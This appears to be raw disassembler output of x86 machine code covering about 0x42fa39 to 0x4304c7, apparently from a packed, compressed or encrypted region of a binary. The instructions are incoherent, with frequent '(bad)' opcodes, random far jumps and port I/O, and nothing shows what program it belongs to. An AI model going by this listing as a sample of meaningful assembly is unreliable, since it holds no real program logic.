  42fa39:	adc    DWORD PTR [ebx+eiz*8],ecx
  42fa3c:	iret   
  42fa3d:	cdq    
  42fa3e:	int    0xf6
  42fa40:	pop    edi
  42fa41:	(bad)  
  42fa42:	jg     0x42fa85
  42fa44:	sbb    BYTE PTR [edx-0x1eb06e04],al
  42fa4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa4b:	aad    0x7c
  42fa4d:	dec    edx
  42fa4e:	int3   
  42fa4f:	aaa    
  42fa50:	repnz sub bh,dl
  42fa53:	dec    ebx
  42fa54:	int3   
  42fa55:	lea    eax,[ecx-0x31]
  42fa58:	loop   0x42fa3b
  42fa5a:	jo     0x42fa97
  42fa5c:	and    DWORD PTR [eax+0x6534e91a],ecx
  42fa62:	mov    esi,0x7ab87abb
  42fa67:	sbb    esp,DWORD PTR [edx]
  42fa69:	xor    DWORD PTR [ebx-0x7d486dc0],ebx
  42fa6f:	in     al,dx
  42fa70:	arpl   sp,bx
  42fa72:	sub    eax,0xe77a873a
  42fa77:	xchg   DWORD PTR [ebx+ebp*1+0xfcf131a],edx
  42fa7e:	sahf   
  42fa7f:	push   esi
  42fa80:	out    0x20,eax
  42fa82:	sub    al,0xb9
  42fa84:	dec    esp
  42fa85:	or     ebx,ebx
  42fa87:	or     BYTE PTR [ecx+esi*8],0x3f
  42fa8b:	arpl   WORD PTR [ebx+esi*1-0x110848b4],si
  42fa92:	test   BYTE PTR cs:[ebx+eiz*4-0x20],al
  42fa97:	in     eax,dx
  42fa98:	es popa 
  42fa9a:	pcmpgtw mm7,QWORD PTR [eax]
  42fa9d:	mov    edx,0x4bd8add9
  42faa2:	fcom   DWORD PTR [esi-0x13]
  42faa5:	mov    edi,0x5f1ff7e6
  42faaa:	sbb    edi,edi
  42faac:	and    BYTE PTR [ecx+eiz*4+0xff66fa7],dh
  42fab3:	icebp  
  42fab4:	sub    al,0x97
  42fab6:	or     dh,dl
  42fab8:	or     cl,ch
  42faba:	jg     0x42fa6f
  42fabc:	emms   
  42fabe:	mov    DWORD PTR [edi],ebp
  42fac0:	mov    DWORD PTR [eax],0x0
	...
  42fb32:	add    BYTE PTR [eax],al
  42fb34:	jle    0x42fb77
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	inc    edx
  42fb41:	fisttp DWORD PTR [eax]
  42fb43:	rol    BYTE PTR [edx-0x9],0x1
  42fb47:	add    ch,dh
  42fb49:	add    BYTE PTR [eax],al
  42fb4b:	add    BYTE PTR [edx-0x664fdb7b],bl
  42fb51:	xor    DWORD PTR [ebx],ebx
  42fb53:	loopne 0x42fb3b
  42fb55:	mov    ds:0x5cabdfa4,al
  42fb5a:	mov    edi,0x32bb82e8
  42fb5f:	jmp    0x42fb8d
  42fb61:	hlt    
  42fb62:	sub    BYTE PTR [edx],cl
  42fb64:	int3   
  42fb65:	out    dx,al
  42fb66:	mov    ecx,edi
  42fb68:	pusha  
  42fb69:	shl    BYTE PTR [ecx+0x5a],cl
  42fb6c:	jo     0x42fb01
  42fb6e:	sahf   
  42fb6f:	push   cs
  42fb70:	aad    0x7b
  42fb72:	xchg   edx,eax
  42fb73:	jle    0x42fb32
  42fb75:	icebp  
  42fb76:	mov    ah,0x47
  42fb78:	xor    al,0x60
  42fb7a:	enter  0x9da4,0x33
  42fb7e:	stos   BYTE PTR es:[edi],al
  42fb7f:	inc    edx
  42fb80:	xchg   ebx,eax
  42fb81:	mov    bh,0x41
  42fb83:	mov    ch,0x74
  42fb85:	test   eax,0x61a798c2
  42fb8a:	dec    edx
  42fb8b:	test   BYTE PTR [esi-0xa],ah
  42fb8e:	jmp    DWORD PTR [edi+0x34]
  42fb91:	sub    bl,BYTE PTR [ebx-0x60]
  42fb94:	pop    DWORD PTR [edi+edi*4+0x6f046c28]
  42fb9b:	sahf   
  42fb9c:	scas   al,BYTE PTR es:[edi]
  42fb9d:	mov    fs,WORD PTR [ebp+0xf5874df]
  42fba3:	sbb    eax,0x6094f9af
  42fba8:	xor    DWORD PTR [esi+0x5eae15ec],ecx
  42fbae:	test   eax,0x7e431c54
  42fbb3:	imul   edx,DWORD PTR [ebx-0x1b],0x8d076262
  42fbba:	inc    eax
  42fbbb:	clc    
  42fbbc:	ds std 
  42fbbe:	add    al,0x85
  42fbc0:	daa    
  42fbc1:	call   0x412e:0x8ba9607e
  42fbc8:	int    0x22
  42fbca:	rol    DWORD PTR [edi+0x6732a03f],0xf
  42fbd1:	pusha  
  42fbd2:	adc    al,0x69
  42fbd4:	mov    BYTE PTR [ebx-0x40],bh
  42fbd7:	nop
  42fbd8:	data16 jnp 0x42fbd6
  42fbdb:	or     cl,BYTE PTR [ecx-0x45109e62]
  42fbe1:	sti    
  42fbe2:	and    eax,DWORD PTR [edi-0x49]
  42fbe5:	xchg   ecx,eax
  42fbe6:	ss mov cl,0x8b
  42fbe9:	sbb    edx,DWORD PTR [ebx-0x75]
  42fbec:	fdivr  DWORD PTR [esi]
  42fbee:	sub    DWORD PTR [edi],edx
  42fbf0:	ror    DWORD PTR ss:[esi-0x76],1
  42fbf4:	call   0xf4e89189
  42fbf9:	jnp    0x42fbe5
  42fbfb:	jecxz  0x42fc67
  42fbfd:	ins    DWORD PTR es:[edi],dx
  42fbfe:	push   ss
  42fbff:	xchg   edx,eax
  42fc00:	jne    0x42fbc8
  42fc02:	xor    eax,0xc85d9405
  42fc07:	mov    al,0xed
  42fc09:	dec    edi
  42fc0a:	(bad)  
  42fc0b:	lods   eax,DWORD PTR ds:[esi]
  42fc0c:	add    eax,0x9cdbbb71
  42fc11:	jbe    0x42fc5a
  42fc13:	jnp    0x42fc5b
  42fc15:	jmp    DWORD PTR gs:[ecx+0x795840c4]
  42fc1c:	mov    es,WORD PTR [ebp+0x78]
  42fc1f:	data16 lock lods al,BYTE PTR ds:[esi]
  42fc22:	mov    ah,0x77
  42fc24:	jae    0x42fc71
  42fc26:	idiv   BYTE PTR [ecx-0x2f]
  42fc29:	test   al,0x99
  42fc2b:	xlat   BYTE PTR ds:[ebx]
  42fc2c:	fsubrp st(1),st
  42fc2e:	or     ebp,DWORD PTR [ecx+edi*1]
  42fc31:	and    DWORD PTR [ebx+0x19e8dcf0],ecx
  42fc37:	xor    eax,0x3dc78c6d
  42fc3c:	jg     0x42fc5e
  42fc3e:	out    dx,al
  42fc3f:	outs   dx,BYTE PTR ds:[esi]
  42fc40:	and    DWORD PTR [eax],eax
	...
  42fcb2:	add    BYTE PTR [eax],al
  42fcb4:	sub    dh,dh
  42fcb6:	scas   eax,DWORD PTR es:[edi]
  42fcb7:	fdivr  st,st(7)
  42fcb9:	fnstcw WORD PTR [edi-0xa]
  42fcbc:	cmp    DWORD PTR [esp+ebx*2],0x18d8d7b9
  42fcc3:	popf   
  42fcc4:	aaa    
  42fcc5:	clc    
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	cmc    
  42fcc9:	add    BYTE PTR [eax],al
  42fccb:	add    cl,bh
  42fccd:	push   es
  42fcce:	fwait
  42fccf:	mov    eax,0x264ff2fc
  42fcd4:	sub    DWORD PTR [eax-0x7e],ebp
  42fcd7:	es fs aaa 
  42fcda:	(bad)  
  42fcdb:	shl    DWORD PTR [edx-0x405a384d],cl
  42fce1:	test   al,0xad
  42fce3:	data16 and dh,BYTE PTR [ebx-0x1a]
  42fce7:	push   esi
  42fce8:	aaa    
  42fce9:	or     ebx,DWORD PTR [edi]
  42fceb:	cmp    DWORD PTR [eax-0x6],esi
  42fcee:	mov    dl,0x65
  42fcf0:	mov    ah,0x8
  42fcf2:	dec    eax
  42fcf3:	add    eax,0x308e8765
  42fcf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcf9:	adc    cl,BYTE PTR [ebx+0x54]
  42fcfc:	pop    esi
  42fcfd:	scas   eax,DWORD PTR es:[edi]
  42fcfe:	sub    bh,0x4
  42fd01:	pop    ebp
  42fd02:	and    eax,0x456a12b2
  42fd07:	adc    eax,0x918b6a18
  42fd0c:	cmp    BYTE PTR [ebp+0x14b1b8bd],bl
  42fd12:	sbb    eax,0x89c44558
  42fd17:	dec    edx
  42fd18:	clc    
  42fd19:	push   eax
  42fd1a:	imul   ebp,DWORD PTR [edi+0x6777dcad],0x2a2a1ee6
  42fd24:	ja     0x42fcdd
  42fd26:	scas   eax,DWORD PTR es:[edi]
  42fd27:	mov    al,ds:0xf0b9458f
  42fd2c:	call   0x875e5f75
  42fd31:	rcl    BYTE PTR [edx+0x4],0x52
  42fd35:	and    DWORD PTR [esi+0x126d373f],esp
  42fd3b:	cdq    
  42fd3c:	ins    BYTE PTR es:[edi],dx
  42fd3d:	push   0x4b0c7f44
  42fd42:	mov    dh,0x7e
  42fd44:	mov    esp,0x5af1f15b
  42fd49:	xor    cl,BYTE PTR [eax]
  42fd4b:	or     al,0xe0
  42fd4d:	push   cs
  42fd4e:	cmp    BYTE PTR [ebp-0x2],cl
  42fd51:	clc    
  42fd52:	ds jmp 0x4162:0x37c7e76d
  42fd5a:	mov    dh,0x20
  42fd5c:	add    ebp,DWORD PTR [eax]
  42fd5e:	rol    BYTE PTR [ebx+0x2246c936],cl
  42fd64:	jae    0x42fd7f
  42fd66:	loope  0x42fd81
  42fd68:	out    0xf,al
  42fd6a:	sbb    al,0x1
  42fd6c:	mov    ebx,0xd1e0962a
  42fd71:	das    
  42fd72:	mul    DWORD PTR [ebp-0x69]
  42fd75:	jmp    0x42fd88
  42fd77:	shl    DWORD PTR [edi-0x29],cl
  42fd7a:	or     al,0x62
  42fd7c:	nop
  42fd7d:	and    ebx,DWORD PTR [edi]
  42fd7f:	repz add al,0x1c
  42fd82:	and    eax,0x39c731be
  42fd87:	and    al,0x8d
  42fd89:	stos   DWORD PTR es:[edi],eax
  42fd8a:	add    esp,ecx
  42fd8c:	jmp    0x301e3ff8
  42fd91:	out    dx,al
  42fd92:	jmp    0x42fdb4
  42fd94:	sub    BYTE PTR [esi],bl
  42fd96:	outs   dx,BYTE PTR ds:[esi]
  42fd97:	cmp    eax,0x3eb7f3f6
  42fd9c:	pop    ebp
  42fd9d:	dec    edi
  42fd9e:	clc    
  42fd9f:	test   al,0xd6
  42fda1:	ret    
  42fda2:	shr    BYTE PTR [esi+0x30],cl
  42fda5:	dec    ebp
  42fda6:	aam    0x3a
  42fda8:	hlt    
  42fda9:	sbb    esi,DWORD PTR [ecx+0x62]
  42fdac:	add    eax,0x2537787d
  42fdb1:	inc    ebx
  42fdb2:	lahf   
  42fdb3:	shl    esi,1
  42fdb5:	push   0x4f
  42fdb7:	ret    
  42fdb8:	mov    ch,0xec
  42fdba:	shr    esp,1
  42fdbc:	xor    ch,BYTE PTR [edx+ebp*4+0x7962]
	...
  42fe33:	add    bl,al
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	cld    
  42fe41:	and    BYTE PTR [ebx+0x47],cl
  42fe44:	sub    al,0xf9
  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	cmc    
  42fe49:	add    BYTE PTR [eax],al
  42fe4b:	add    BYTE PTR [ebx+0x15310ae0],bh
  42fe51:	fcom   DWORD PTR [eax-0x1fa07eb8]
  42fe57:	cmp    al,0xcc
  42fe59:	pop    ebx
  42fe5a:	int3   
  42fe5b:	mov    WORD PTR [edi+0x24bfd49b],ds
  42fe61:	push   edi
  42fe62:	cmp    ebx,DWORD PTR [ebx]
  42fe64:	sub    BYTE PTR [edx],0x9
  42fe67:	dec    esi
  42fe68:	sub    BYTE PTR [edx+0x1c],ch
  42fe6b:	xchg   BYTE PTR [ebx+0x6],ch
  42fe6e:	ins    DWORD PTR es:[edi],dx
  42fe6f:	aad    0xdb
  42fe71:	sub    ah,BYTE PTR [ebp-0x27]
  42fe74:	mov    edi,0x5831487
  42fe79:	mov    ds:0x9b4c781d,eax
  42fe7e:	cmp    dh,BYTE PTR [esi]
  42fe80:	adc    dh,ch
  42fe82:	test   DWORD PTR [esi+0x2f],edx
  42fe85:	mov    WORD PTR [edi],es
  42fe87:	or     BYTE PTR [edx-0x1bb0e4c3],dl
  42fe8d:	int    0x54
  42fe8f:	bound  edx,QWORD PTR [edi+eax*4+0x10544695]
  42fe96:	or     eax,DWORD PTR [esi+ecx*8-0xc4b8fbd]
  42fe9d:	pop    edi
  42fe9e:	cmp    eax,0x99136412
  42fea3:	aas    
  42fea4:	lods   al,BYTE PTR ds:[esi]
  42fea5:	clc    
  42fea6:	fsub   DWORD PTR [ecx+0x7688fd0a]
  42feac:	stos   BYTE PTR es:[edi],al
  42fead:	xchg   esp,eax
  42feae:	aaa    
  42feaf:	sub    eax,0xf713d162
  42feb4:	dec    edi
  42feb5:	xchg   ebx,eax
  42feb6:	and    al,0x98
  42feb8:	test   BYTE PTR [edx+0x7ff4a6cf],ah
  42febe:	dec    ebp
  42febf:	xor    ch,BYTE PTR [edx+eiz*2+0x76]
  42fec3:	mov    bh,0x7f
  42fec5:	pop    es
  42fec6:	sahf   
  42fec7:	cli    
  42fec8:	push   ss
  42fec9:	fbld   TBYTE PTR [ecx+0x45696da3]
  42fecf:	cmp    ch,al
  42fed1:	mov    cl,0xa2
  42fed3:	pushf  
  42fed4:	add    dh,bl
  42fed6:	ret    0xb4c
  42fed9:	lock push edi
  42fedb:	rcr    esp,0x23
  42fede:	xchg   edx,eax
  42fedf:	loopne 0x42ff04
  42fee1:	sahf   
  42fee2:	cwde   
  42fee3:	test   al,0x50
  42fee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fee6:	xchg   ebx,eax
  42fee7:	(bad)  
  42fee8:	shl    bh,1
  42feea:	jmp    0xf18710f4
  42feef:	rcr    DWORD PTR [ebx+0xb],cl
  42fef2:	retf   0xb76d
  42fef5:	xchg   edx,eax
  42fef6:	xlat   BYTE PTR ds:[ebx]
  42fef7:	and    DWORD PTR [ecx+0x78fcbe61],ebp
  42fefd:	pop    esi
  42fefe:	mov    ebp,DWORD PTR [ebx-0x3eb77324]
  42ff04:	cli    
  42ff05:	(bad)  
  42ff06:	mov    ?,WORD PTR [edx-0x65]
  42ff09:	shl    BYTE PTR [esi+ebx*4+0x32],cl
  42ff0d:	(bad)  
  42ff0e:	mov    al,0x57
  42ff10:	and    ebx,ebp
  42ff12:	adc    esp,ebp
  42ff14:	in     al,dx
  42ff15:	and    edx,DWORD PTR [eax+0x19]
  42ff18:	mov    ah,0xc0
  42ff1a:	dec    edx
  42ff1b:	call   0xc66e0b7c
  42ff20:	xor    eax,0x76910151
  42ff25:	pop    ss
  42ff26:	(bad)
  42ff29:	push   esi
  42ff2a:	adc    ecx,DWORD PTR [edx+edi*2-0x78]
  42ff2e:	stc    
  42ff2f:	or     BYTE PTR [edi+esi*2+0x5],ah
  42ff33:	lods   al,BYTE PTR ds:[esi]
  42ff34:	xchg   edi,eax
  42ff35:	inc    ecx
  42ff36:	mov    eax,ds:0x72c229f2
  42ff3b:	mov    eax,0xcb0fdc8f
  42ff40:	outs   dx,DWORD PTR ds:[esi]
	...
  42ffb1:	add    BYTE PTR [eax],al
  42ffb3:	add    BYTE PTR [edx],dl
  42ffb5:	ds int 0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx+0x4c897fea]
  42ffc1:	mov    edi,0xfa213052
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	cmc    
  42ffc9:	add    BYTE PTR [eax],al
  42ffcb:	add    BYTE PTR [ecx+ecx*8+0x771d6ba],ah
  42ffd2:	adc    al,0x10
  42ffd4:	nop
  42ffd5:	enter  0xfbc5,0x3d
  42ffd9:	dec    eax
  42ffda:	jns    0x43004c
  42ffdc:	js     0x42ffdb
  42ffde:	leave  
  42ffdf:	mov    DWORD PTR [ebx+0x2b],0x7e1173f9
  42ffe6:	frstor [edi+0x199db35e]
  42ffec:	rol    dh,1
  42ffee:	(bad)  
  42ffef:	push   eax
  42fff0:	lds    ecx,FWORD PTR [ebx+esi*2+0x3973eb3b]
  42fff7:	jge    0x430028
  42fff9:	or     eax,0xcab2388d
  42fffe:	ins    DWORD PTR es:[edi],dx
  42ffff:	sbb    al,0xd9
  430001:	jnp    0x42ffe7
  430003:	stos   BYTE PTR es:[edi],al
  430004:	pop    eax
  430005:	call   FWORD PTR [esi]
  430007:	push   ecx
  430008:	push   0x5c46b3b2
  43000d:	pop    edi
  43000e:	mov    esi,0x9afab209
  430013:	pushf  
  430014:	imul   eax,DWORD PTR [ebx+ebx*4+0x24],0xffffffbc
  430019:	mov    ds:0x716b656c,eax
  43001e:	jb     0x42ffeb
  430020:	cmp    al,0x6d
  430022:	das    
  430023:	mov    bh,0xfe
  430025:	add    DWORD PTR [ecx-0x73524be6],edx
  43002b:	mov    eax,0xac43387b
  430030:	cmp    ecx,DWORD PTR ds:0x81efb208
  430036:	mov    ebp,DWORD PTR [ebx-0xd]
  430039:	aaa    
  43003a:	sti    
  43003b:	mov    esp,0x253a9d68
  430040:	sub    ah,BYTE PTR [edi+0x1c]
  430043:	dec    eax
  430044:	cs jns 0x4300b6
  430047:	mov    dl,0xd6
  430049:	mov    dl,dl
  43004b:	xor    al,BYTE PTR [esi+0x13cbbd4c]
  430051:	ffreep st(3)
  430053:	je     0x430081
  430055:	cmc    
  430056:	inc    esi
  430057:	adc    DWORD PTR [ebx-0x5e],eax
  43005a:	mov    esp,esi
  43005c:	adc    DWORD PTR [ecx+0x68042f72],ecx
  430062:	sub    DWORD PTR [ebp-0x23],edx
  430065:	xchg   edi,eax
  430066:	xchg   BYTE PTR [edx-0x37],al
  430069:	ja     0x430024
  43006b:	lods   al,BYTE PTR ds:[esi]
  43006c:	ins    BYTE PTR es:[edi],dx
  43006d:	mov    dh,0x67
  43006f:	shr    DWORD PTR [esi-0x18b4a718],cl
  430075:	ins    BYTE PTR es:[edi],dx
  430076:	sbb    BYTE PTR [eax+0x6fed1fe5],cl
  43007c:	outs   dx,DWORD PTR ds:[esi]
  43007d:	out    dx,eax
  43007e:	pop    ebx
  43007f:	cmp    al,0xcd
  430081:	sbb    DWORD PTR [ebp-0x57],esp
  430084:	xor    eax,DWORD PTR [ecx]
  430086:	jne    0x430103
  430088:	stos   BYTE PTR es:[edi],al
  430089:	fisubr WORD PTR ds:[esi]
  43008c:	mov    al,0x88
  43008e:	jmp    0x842df7b5
  430093:	jmp    0x17fc:0xc7d913d8
  43009a:	mov    ds:0xdb4fa787,al
  43009f:	mov    ds:0xab0e4085,al
  4300a4:	(bad)  
  4300a5:	mov    dh,0x27
  4300a7:	std    
  4300a8:	in     eax,dx
  4300a9:	enter  0x793d,0x3b
  4300ad:	out    0x34,eax
  4300af:	or     BYTE PTR [ebx],ah
  4300b1:	aaa    
  4300b2:	mov    bh,0x47
  4300b4:	dec    ebp
  4300b5:	push   ds
  4300b6:	adc    al,0xfa
  4300b8:	xor    BYTE PTR [eax],bl
  4300ba:	cmp    esi,DWORD PTR [edi-0x3f]
  4300bd:	jmp    DWORD PTR [esi+ebp*4+0xa5]
	...
  430134:	pop    edx
  430135:	es jecxz 0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0x58df:0xa690a608
  430144:	push   ss
  430145:	sti    
  430146:	add    DWORD PTR [eax],eax
  430148:	cmc    
  430149:	add    BYTE PTR [eax],al
  43014b:	add    BYTE PTR [eax+0x42c56f21],dl
  430151:	loopne 0x4300d6
  430153:	es pop eax
  430155:	jg     0x430112
  430157:	out    0xe3,al
  430159:	sbb    al,0xbc
  43015b:	hlt    
  43015c:	inc    esp
  43015d:	pop    esp
  43015e:	cmp    al,0x24
  430160:	out    0xca,al
  430162:	scas   al,BYTE PTR es:[edi]
  430163:	xor    ebp,esp
  430165:	fnsave [edx-0x42]
  430168:	aaa    
  430169:	in     eax,dx
  43016a:	mov    ds:0x20716045,al
  43016f:	cmp    edi,ecx
  430171:	pop    es
  430172:	inc    ebx
  430173:	add    al,BYTE PTR [edx]
  430175:	pop    ds
  430176:	sub    al,0x4a
  430178:	jne    0x4301c8
  43017a:	pop    esp
  43017b:	xor    edx,edi
  43017d:	dec    ebx
  43017e:	hlt    
  43017f:	mov    eax,0x5fb91936
  430184:	enter  0xfbc8,0xe2
  430188:	ror    BYTE PTR [edi+eiz*1-0x54ddb9ae],cl
  43018f:	push   0xffffff93
  430191:	add    ecx,DWORD PTR [ecx+eax*4]
  430194:	mov    ds:0x978b14dc,al
  430199:	(bad)  
  43019a:	xchg   ecx,eax
  43019b:	xchg   BYTE PTR [edi],ah
  43019d:	xchg   esi,eax
  43019e:	dec    eax
  43019f:	pop    eax
  4301a0:	push   esp
  4301a1:	xchg   ecx,eax
  4301a2:	xor    esi,DWORD PTR ds:0x77d4391f
  4301a8:	int3   
  4301a9:	cwde   
  4301aa:	int    0x5b
  4301ac:	es or  al,0x2
  4301af:	fwait
  4301b0:	push   ebp
  4301b1:	mov    cs,esp
  4301b3:	fwait
  4301b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301b5:	sbb    DWORD PTR [eax+0x2a84e018],esp
  4301bb:	jmp    0x987a5720
  4301c0:	repnz into 
  4301c2:	push   ds
  4301c3:	pop    ebp
  4301c4:	stos   BYTE PTR es:[edi],al
  4301c5:	sbb    al,0xf0
  4301c7:	pop    edi
  4301c8:	add    BYTE PTR [ecx-0x4],al
  4301cb:	adc    ecx,DWORD PTR [ecx]
  4301cd:	push   cs
  4301ce:	iret   
  4301cf:	push   ds
  4301d0:	lock fdivr DWORD PTR ds:[bp+0x35b4]
  4301d7:	push   gs
  4301d9:	mov    edx,0x90d2548f
  4301de:	fimul  DWORD PTR [edi+0x32a0a9c4]
  4301e4:	ror    BYTE PTR [edx+0x5acf8f2b],cl
  4301ea:	push   es
  4301eb:	push   edx
  4301ec:	(bad)  
  4301ed:	push   esi
  4301ee:	icebp  
  4301ef:	xchg   ebx,eax
  4301f0:	mov    eax,0x64c3a63a
  4301f5:	int    0xea
  4301f7:	iret   
  4301f8:	jne    0x43024a
  4301fa:	out    dx,al
  4301fb:	add    dl,dh
  4301fd:	inc    esi
  4301fe:	or     ah,BYTE PTR ds:0xc9baa4
  430204:	popa   
  430205:	gs dec ebp
  430207:	add    al,0xd3
  430209:	je     0x4301cd
  43020b:	jl     0x430223
  43020d:	mov    DWORD PTR [eax],edi
  43020f:	or     ch,bh
  430211:	jmp    0x4301c5
  430213:	je     0x430263
  430215:	jecxz  0x430293
  430217:	ror    edi,cl
  430219:	fisttp WORD PTR [ebp-0x342130ad]
  43021f:	ds dec ebx
  430221:	mov    al,0x63
  430223:	sbb    al,0xfb
  430225:	adc    edi,DWORD PTR cs:[ebp+0x43]
  430229:	mov    ecx,0x1bcd3762
  43022e:	test   DWORD PTR [esi],ecx
  430230:	push   eax
  430231:	das    
  430232:	pop    edx
  430233:	add    DWORD PTR [edi+ecx*2-0x30],0x9a14e74f
  43023b:	ins    DWORD PTR es:[edi],dx
  43023c:	sbb    esi,ecx
  43023e:	arpl   bx,ax
  430240:	xchg   ebx,eax
	...
  4302b1:	add    BYTE PTR [eax],al
  4302b3:	add    BYTE PTR [ebp-0x5075f7e6],bh
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	jmp    0xb4b7b86
  4302c5:	cld    
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	cmc    
  4302c9:	add    BYTE PTR [eax],al
  4302cb:	add    BYTE PTR [edi-0x2e],al
  4302ce:	popf   
  4302cf:	popa   
  4302d0:	sbb    al,0x15
  4302d2:	shr    DWORD PTR [ebp-0x80],0x8e
  4302d6:	ins    BYTE PTR es:[edi],dx
  4302d7:	mov    esp,0xb348e74b
  4302dc:	cmp    bl,BYTE PTR [ebp+0x11986291]
  4302e2:	sub    ebp,ecx
  4302e4:	push   eax
  4302e5:	fisub  DWORD PTR [edx]
  4302e7:	sub    dl,BYTE PTR [ecx+esi*8-0x5653dbf9]
  4302ee:	and    DWORD PTR [esi-0x50],ebp
  4302f1:	pop    esp
  4302f2:	mov    bh,0xd2
  4302f4:	sbb    BYTE PTR [edi],cl
  4302f6:	push   ss
  4302f7:	dec    ebp
  4302f8:	push   DWORD PTR [ebp-0x27]
  4302fb:	sti    
  4302fc:	fwait
  4302fd:	mul    DWORD PTR [ecx]
  4302ff:	xor    ah,BYTE PTR [ebx+0x57]
  430302:	sar    BYTE PTR [edi-0x78aacb24],0x4d
  430309:	or     BYTE PTR [edx-0x2ad7ab8b],bl
  43030f:	push   ebx
  430310:	rcr    DWORD PTR [ebp-0x10cc11e7],0x77
  430317:	cmc    
  430318:	xchg   esp,eax
  430319:	gs call 0x1d8e:0xcea5f123
  430321:	jns    0x43037f
  430323:	sbb    eax,0x2d25e06e
  430328:	and    bh,dl
  43032a:	push   0xfffffffd
  43032c:	(bad)  
  43032d:	cld    
  43032e:	in     eax,dx
  43032f:	into   
  430330:	dec    ebx
  430331:	fwait
  430332:	scas   eax,DWORD PTR es:[edi]
  430333:	adc    BYTE PTR [eax-0xe5108f],ah
  430339:	clc    
  43033a:	enter  0x8a16,0x78
  43033e:	or     cl,ch
  430340:	jne    0x430327
  430342:	mov    edx,0xc8cec4b7
  430347:	test   BYTE PTR [edi],ch
  430349:	das    
  43034a:	ficom  WORD PTR [edx+0x6e]
  43034d:	jge    0x4303ac
  43034f:	cs mov cl,0xa1
  430352:	retf   0xe431
  430355:	es loop 0x430389
  430358:	mov    bl,0xa4
  43035a:	arpl   WORD PTR [ebp+0x46f629c8],si
  430360:	and    DWORD PTR [esi-0x75],ecx
  430363:	jecxz  0x4303a5
  430365:	sub    BYTE PTR [edx],ah
  430367:	pop    eax
  430368:	rcl    DWORD PTR [edi-0x358b91e1],0x85
  43036f:	test   BYTE PTR [edx+eiz*8],bh
  430372:	inc    edi
  430373:	pop    es
  430374:	(bad)  
  430375:	std    
  430376:	sbb    edi,ecx
  430378:	lods   al,BYTE PTR ds:[esi]
  430379:	and    DWORD PTR [edi],0x22697ed3
  43037f:	loopne 0x43037c
  430381:	push   ss
  430382:	pop    esi
  430383:	pushf  
  430384:	jmp    0x430394
  430386:	test   DWORD PTR [ebp-0x6c],eax
  430389:	dec    esi
  43038a:	adc    edi,DWORD PTR [ecx+0x1b]
  43038d:	or     DWORD PTR [ecx+eiz*4+0x77],esp
  430391:	mov    BYTE PTR [eax],bh
  430393:	shl    BYTE PTR [esi],1
  430395:	call   0x2954:0xad808836
  43039c:	xchg   BYTE PTR [ebx-0x6e],bh
  43039f:	fbld   TBYTE PTR [eax+0x5f]
  4303a2:	stc    
  4303a3:	shl    al,1
  4303a5:	movq   QWORD PTR [ecx+eax*4+0xe],mm6
  4303aa:	dec    edx
  4303ab:	xor    esi,DWORD PTR [edi+0x2f]
  4303ae:	shl    BYTE PTR [esi+0x5a],1
  4303b1:	sbb    dh,BYTE PTR [ecx+0x240bbc8f]
  4303b7:	je     0x430391
  4303b9:	loope  0x430348
  4303bb:	pop    ecx
  4303bc:	jae    0x430377
  4303be:	pop    edi
  4303bf:	cmp    edx,DWORD PTR [eax+eax*1]
	...
  430432:	add    BYTE PTR [eax],al
  430434:	aaa    
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfd00:0x9836348a
  430446:	add    DWORD PTR [eax],eax
  430448:	cmc    
  430449:	add    BYTE PTR [eax],al
  43044b:	add    BYTE PTR [esi],ah
  43044d:	sub    al,0xad
  43044f:	retf   0x19ab
  430452:	iret   
  430453:	jno    0x43047e
  430455:	popa   
  430456:	unpckhps xmm3,XMMWORD PTR [ecx-0x66]
  43045a:	aad    0x21
  43045c:	mov    ch,BYTE PTR [edx-0x54ebb0d7]
  430462:	sub    eax,esi
  430464:	xor    DWORD PTR [ecx-0x415b62a8],esi
  43046a:	xlat   BYTE PTR ds:[ebx]
  43046b:	dec    ebp
  43046c:	in     eax,0xe3
  43046e:	lock mov ah,0xee
  430471:	or     cl,bl
  430473:	xchg   edx,eax
  430474:	iret   
  430475:	arpl   WORD PTR [ebp+0x5f],dx
  430478:	xchg   ebx,eax
  430479:	dec    ecx
  43047a:	rol    BYTE PTR [edi+0x263e9ca6],1
  430480:	ffree  st(0)
  430482:	pop    ebx
  430483:	inc    edi
  430484:	mov    ebx,0x22289a8f
  430489:	int    0xbf
  43048b:	cdq    
  43048c:	fdivr  QWORD PTR [eax+eax*4]
  43048f:	mov    cl,bh
  430491:	xchg   eax,edi
  430493:	aas    
  430494:	xchg   BYTE PTR [ecx+edx*1],bl
  430497:	jnp    0x430489
  430499:	sub    esp,DWORD PTR [ebp-0x51]
  43049c:	(bad)  
  43049d:	cmp    al,0x7b
  43049f:	sbb    eax,0x51bdf75d
  4304a4:	inc    edi
  4304a5:	xchg   ebp,eax
  4304a6:	cwde   
  4304a7:	(bad)  
  4304a8:	fsubr  QWORD PTR [esi]
  4304aa:	inc    edi
  4304ab:	fsubr  st,st(2)
  4304ad:	ja     0x430480
  4304af:	(bad)  
  4304b1:	adc    esp,DWORD PTR [eax-0x7b]
  4304b4:	inc    edi
  4304b5:	test   al,0xf9
  4304b7:	cwde   
  4304b8:	(bad)  [ecx-0xf677e13]
  4304be:	adc    ch,BYTE PTR [edi-0x25]
  4304c1:	outs   dx,DWORD PTR ds:[esi]
  4304c2:	popa   
  4304c3:	lahf   
  4304c4:	aaa    
  4304c5:	scas   eax,DWORD PTR es:[edi]
  4304c6:	(bad)  
  4304c7:	div    BYTE PTR [edi]
